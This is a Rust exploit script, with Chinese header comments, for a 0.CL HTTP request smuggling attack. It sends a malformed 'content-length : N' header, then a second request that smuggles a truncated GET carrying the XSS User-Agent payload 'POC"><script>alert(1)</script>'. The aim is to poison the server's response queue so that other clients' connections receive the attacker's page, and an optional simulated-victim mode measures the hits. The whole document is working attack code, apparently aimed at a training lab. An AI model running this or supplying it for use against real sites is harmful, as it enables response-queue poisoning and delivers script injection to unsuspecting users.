#!/usr/bin/env rust-script
//! name: zc0cl2
//! description: 0.CL 双发利用件(可换形态) - attack1 = 静态 gadget(每轮新查询串强制回源,后端早答)+ 指定的畸变 Content-Length 形态(默认 `content-length : N`,实证前端忽略/后端按值);attack2 = 恰好 N 字节的头块(被后端当 attack1 的体吃掉)+ 完整请求 R(后端答一条供前端配对)+ 截断的 XSS 请求 T(后端挂起等下一个客户端字节);每轮记账 a1 是否早答、a2 回了几条、受害者探针是否拿到 XSS 帖子页。形态可换、偏移逐轮现算。
//! version: 1.0.0
//! args: <base-url> [--gadget PATH] [--method1 GET] [--clform 'content-length : {N}'] [--probe-path /wrtz] [--post-id 1] [--ua PAYLOAD] [--salt S] [--rounds N] [--gap-ms N] [--read-ms N] [--pipeline] [--sim-victim] [--victim-delay-ms N] [--victim-read-ms N] [--victim-conns N] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, poisoning, xss, delivery, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

fn classify(buf: &[u8]) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    json!({
        "bytes": buf.len(),
        "statuses": statuses,
        "status_count": statuses.len(),
        "xss_hit": text.contains(MARKER_UA_PREFIX) || text.contains("<script>alert"),
        "post_page": text.contains("Leave a comment") || text.contains("name=\"userAgent\"") || text.contains("name=userAgent") || text.contains("<h1>Comments</h1>"),
        "head": text.chars().take(70).collect::<String>(),
    })
}

static MARKER_UA_PREFIX: &str = "POC";

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let v = classify(b"HTTP/1.1 200 OK\r\n\r\nname=\"userAgent\"");
        let ok = v["status_count"] == 1 && v["post_page"] == true;
        pi_rust_lib::report::success("zc0cl2", json!({"selftest": if ok {"ok"} else {"fail"}, "v": v}), "classifier is the pure root").unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("zc0cl2", "usage", "call as: zc0cl2 <base-url> [--rounds N] [--sim-victim]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let gadget = arg_val(&argv, "--gadget").unwrap_or_else(|| "/resources/images/blog.svg".to_string());
    let method1 = arg_val(&argv, "--method1").unwrap_or_else(|| "GET".to_string());
    let clform = arg_val(&argv, "--clform").unwrap_or_else(|| "content-length : {N}".to_string());
    let probe_path = arg_val(&argv, "--probe-path").unwrap_or_else(|| "/wrtz".to_string());
    let post_id = arg_val(&argv, "--post-id").unwrap_or_else(|| "1".to_string());
    let ua = arg_val(&argv, "--ua").unwrap_or_else(|| "POC\"><script>alert(1)</script>".to_string());
    let salt = arg_val(&argv, "--salt").unwrap_or_else(|| "s1".to_string());
    let rounds: u64 = arg_val(&argv, "--rounds").and_then(|v| v.parse().ok()).unwrap_or(1);
    let gap_ms: u64 = arg_val(&argv, "--gap-ms").and_then(|v| v.parse().ok()).unwrap_or(150);
    let read_ms: u64 = arg_val(&argv, "--read-ms").and_then(|v| v.parse().ok()).unwrap_or(2500);
    let victim_delay_ms: u64 = arg_val(&argv, "--victim-delay-ms").and_then(|v| v.parse().ok()).unwrap_or(300);
    let victim_read_ms: u64 = arg_val(&argv, "--victim-read-ms").and_then(|v| v.parse().ok()).unwrap_or(4000);
    let victim_conns: u64 = arg_val(&argv, "--victim-conns").and_then(|v| v.parse().ok()).unwrap_or(3);
    let pipeline = argv.iter().any(|a| a == "--pipeline");
    let sim_victim = argv.iter().any(|a| a == "--sim-victim");

    let mut log: Vec<Value> = Vec::new();
    let mut last_err = String::new();
    let mut desync_rounds: u64 = 0;
    let mut victim_hits: u64 = 0;
    let mut victim_post_pages: u64 = 0;
    for round in 0..rounds {
        if round > 0 && gap_ms > 0 {
            std::thread::sleep(Duration::from_millis(gap_ms));
        }
        timeout::check();
        let gurl = format!("{gadget}?a={salt}{round}");
        let gurl2 = format!("{gadget}?b={salt}{round}");
        let t = format!("GET /post?postId={post_id} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}");
        let r = format!("GET {probe_path}{salt}{round} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n");
        let body = format!("{r}{t}");
        let m = body.len();
        let hdr2 = format!("GET {gurl2} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {m}\r\nConnection: keep-alive\r\n\r\n");
        let n = hdr2.len();
        let cl_line = clform.replace("{N}", &n.to_string());
        let attack1 = format!("{method1} {gurl} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: /\r\nConnection: keep-alive\r\n{cl_line}\r\n\r\n");
        let attack2 = format!("{hdr2}{body}");
        let victim = format!("GET / HTTP/1.1\r\nHost: {host}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
        let mut row = json!({"round": round, "n": n, "m": m, "attack1_len": attack1.len(), "attack2_len": attack2.len(), "cl_line": cl_line});

        let mut c1 = match connect(&host, port) {
            Ok(s) => s,
            Err(e) => {
                last_err = e;
                break;
            }
        };
        if pipeline {
            let both = format!("{attack1}{attack2}");
            if let Err(e) = c1.write_all(both.as_bytes()) {
                last_err = format!("pipeline write: {e}");
                break;
            }
            let _ = c1.flush();
            let a2 = drain(&mut c1, read_ms, 300);
            let cc = classify(&a2);
            row["a2"] = cc.clone();
            let desync = cc["status_count"].as_u64().unwrap_or(0) >= 2 || a2.windows(4).any(|w| w == b"404 ");
            if desync {
                desync_rounds += 1;
            }
            row["desync"] = json!(desync);
        } else {
            if let Err(e) = c1.write_all(attack1.as_bytes()) {
                last_err = format!("attack1 write: {e}");
                break;
            }
            let _ = c1.flush();
            let a1 = drain(&mut c1, 900, 250);
            row["a1"] = classify(&a1);
            if let Err(e) = c1.write_all(attack2.as_bytes()) {
                last_err = format!("attack2 write: {e}");
                break;
            }
            let _ = c1.flush();
            let a2 = drain(&mut c1, read_ms, 300);
            let cc = classify(&a2);
            let desync = cc["status_count"].as_u64().unwrap_or(0) >= 2;
            if desync {
                desync_rounds += 1;
            }
            row["a2"] = cc;
            row["desync"] = json!(desync);
        }

        if sim_victim {
            if victim_delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(victim_delay_ms));
            }
            let mut vs: Vec<Value> = Vec::new();
            for _ in 0..victim_conns {
                timeout::check();
                let vr = (|| -> Result<Value, String> {
                    let mut c = connect(&host, port)?;
                    c.write_all(victim.as_bytes()).map_err(|e| e.to_string())?;
                    let _ = c.flush();
                    let b = drain(&mut c, victim_read_ms, 500);
                    Ok(classify(&b))
                })();
                match vr {
                    Ok(v) => {
                        if v["xss_hit"].as_bool().unwrap_or(false) {
                            victim_hits += 1;
                        }
                        if v["post_page"].as_bool().unwrap_or(false) {
                            victim_post_pages += 1;
                        }
                        vs.push(v);
                    }
                    Err(e) => vs.push(json!({"error": e})),
                }
            }
            row["victim"] = json!(vs);
        }
        drop(c1);
        log.push(row);
        if sim_victim && victim_hits > 0 {
            break;
        }
    }

    pi_rust_lib::report::success(
        "zc0cl2",
        json!({
            "url": base,
            "host": host,
            "gadget": gadget,
            "clform": clform,
            "pipeline": pipeline,
            "rounds": log,
            "desync_rounds": desync_rounds,
            "victim_xss_hits": victim_hits,
            "victim_post_pages": victim_post_pages,
            "last_error": last_err,
        }),
        "victim_xss_hits>0 (or victim_post_pages>0) proves the queued XSS page reached another client connection",
    )
    .unwrap_or(());
}
